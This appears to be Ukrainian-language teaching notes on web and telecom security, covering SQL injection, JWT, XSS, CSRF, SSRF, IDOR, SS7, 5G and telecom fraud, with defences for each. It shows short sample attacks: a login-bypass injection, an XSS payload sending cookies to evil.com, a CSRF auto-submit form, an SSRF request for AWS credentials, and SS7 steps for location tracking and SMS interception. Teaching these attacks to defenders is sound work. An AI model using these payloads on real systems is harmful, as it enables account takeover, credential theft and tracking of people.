1. Чому веб-застосунки є ціллю №1

Веб-застосунки відкриті для Internet 24/7, містять бізнес-логіку та персональні дані мільйонів користувачів. За даними Verizon DBIR 2023, 43% усіх кібератак спрямовані на веб-застосунки.

Ключові чинники ризику

  • Публічна доступність з будь-якого куточка світу
  • Зростаюча складність: мікросервіси, SPA, GraphQL API
  • Швидкий цикл розробки (CI/CD) без достатнього security review
  • Залежність від третіх сторін (npm, pip, Maven)

3. SQL Injection — детальний розбір

Механізм атаки

-- Вразливий PHP-код:
$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "'";

-- Введення зловмисника: admin' --
-- Результуючий запит:
SELECT * FROM users WHERE username='admin' --'
-- Коментар '--' ігнорує умову пароля → вхід без пароля!

Типи SQL Injection

ТипХарактеристика
In-bandРезультат відразу видно у відповіді
Blind BooleanУмовні відповіді (true/false)
Blind Time-basedЗатримка відповіді (SLEEP(5))
Out-of-bandДані надсилаються до зовнішнього DNS-сервера

Захист

  1. Parameterized queries — єдиний надійний метод
  2. ORM — але уважно з raw queries та string interpolation
  3. Input validation — whitelist дозволених символів
  4. Least privilege — обліковий запис БД без DROP, CREATE
  5. WAF — додатковий рівень захисту

4. Вразливості автентифікації та JWT

JWT атаки

alg: none атака

Якщо сервер приймає алгоритм none — підпис не перевіряється, зловмисник може підробити будь-який токен.

Algorithm Confusion (RS256 → HS256)

Зловмисник змінює алгоритм у заголовку JWT та використовує публічний ключ RS256 як HMAC-секрет для підпису HS256. Сервер без строгої перевірки алгоритму приймає підроблений токен.

Кращі практики

  • Строго фіксувати алгоритм (alg whitelist на сервері)
  • HMAC секрет ≥ 256 біт, криптографічно згенерований
  • Короткий TTL (exp), Refresh token з ротацією
  • Зберігати у httpOnly; Secure; SameSite=Strict cookie
  • OAuth 2.0 + PKCE для публічних клієнтів (SPA, Mobile)

5. XSS — Cross-Site Scripting

Reflected XSS

-- URL зловмисника:
https://shop.example/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

-- Сервер відображає без екранування:
<p>Результати: <script>document.location=...</script></p>

Content Security Policy

Content-Security-Policy: default-src 'self';
  script-src 'self' https://trusted-cdn.example;
  style-src 'self' 'nonce-{random}';
  img-src 'self' data:;
  frame-ancestors 'none';

Захист

РівеньМеханізм
Вихідне кодуванняhtmlspecialchars(), encodeURIComponent()

Cookie атрибутиHttpOnly; Secure; SameSite=Strict
БібліотекиDOMPurify, OWASP Java Encoder

6. CSRF та SSRF

CSRF — механізм атаки

<!-- На сайті зловмисника evil.com -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();</script>

SSRF — атака на AWS IMDS

POST /api/fetch HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}

Відповідь:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
IMDSv2 вирішує цю проблему: для отримання metadata спочатку потрібно PUT-запит за токеном, який не можна підробити через SSRF.

7. IDOR та Broken Access Control

GET /api/orders/10001 → 200 OK  (моє замовлення)
GET /api/orders/10002 → 200 OK  (замовлення ІНШОГО клієнта!) ← IDOR

Виправлення:
if order.user_id != current_user.id:
    return 403 Forbidden

Горизонтальне vs Вертикальне підвищення привілеїв

  • Горизонтальне: Користувач A отримує доступ до даних Користувача B (однакова роль)
  • Вертикальне: Звичайний користувач виконує адміністративні функції

8. SS7 — Вразливості протоколу сигналізації

SS7 розроблявся у 1975 році для закритих телефонних мереж, де всі учасники вважалися довіреними. Сьогодні доступ до SS7 мають тисячі операторів по всьому світу.

Відстеження місцезнаходження

1. SRI-SM (SendRoutingInfoForSM) → отримує IMSI + MSC address
2. PSI (ProvideSubscriberInfo)  → Cell ID абонента
3. Cell ID → GPS координати через відкриті бази даних
Точність: 50–300 метрів у містах

Перехоплення SMS для bypass 2FA

1. SRI-SM → IMSI жертви
2. RegisterSS → переадресація SMS на номер зловмисника
3. "Забув пароль" на bank.example
4. OTP SMS → до зловмисника → злом акаунту

Захист

  • SS7 Firewall — фільтрація аномальних MAP-повідомлень
  • GSMA FS.11 — базові правила фільтрації
  • Моніторинг — аномальні SRI, ATI, RegisterSS запити
  • Перехід на Diameter (4G) та HTTP/2 SBI (5G)

9. 5G Security Architecture

SUCI — Subscription Concealed Identifier

У 4G IMSI передавався відкрито (IMSI catcher — Stingray). У 5G SUPI шифрується публічним ключем оператора (ECIES):

SUPI (реальний): 255-01-1234567890
SUCI (зашифрований): [публічний ключ оператора ECIES]
→ Навіть базова станція не знає реального SUPI!

Service-Based Architecture (SBA)

AMF ←──── HTTP/2 + OAuth 2.0 ────→ SMF
NRF ←──── HTTP/2 + mTLS ──────→  PCF

5G Загрози

ЗагрозаОпис

Rogue AMFПідробна Access & Mobility Management Function
Slice Isolation FailureВитік між мережевими слайсами
SBI API attacksJWT forgery, OAuth misconfiguration між NF

10. Telecom Fraud

IRSF (International Revenue Share Fraud)

Найдорожчий вид шахрайства: ~$6 млрд/рік. Шахрай орендує premium-номер → генерує масові дзвінки → отримує 60-80% від вартості дзвінка.

STIR/SHAKEN — захист CallerID

Оригінатор → підписує JWT з номером та attestation → верифікується отримувачем
Attestation A: повна верифікація абонента
Attestation B: відомий шлюз, абонент невідомий
Attestation C: лише маршрут верифіковано

FMS — Fraud Management System

  • Реального часу аналіз CDR (Call Detail Records)
  • ML-моделі для виявлення аномальних патернів дзвінків
  • GSMA T-ISAC — обмін даними про загрози між операторами
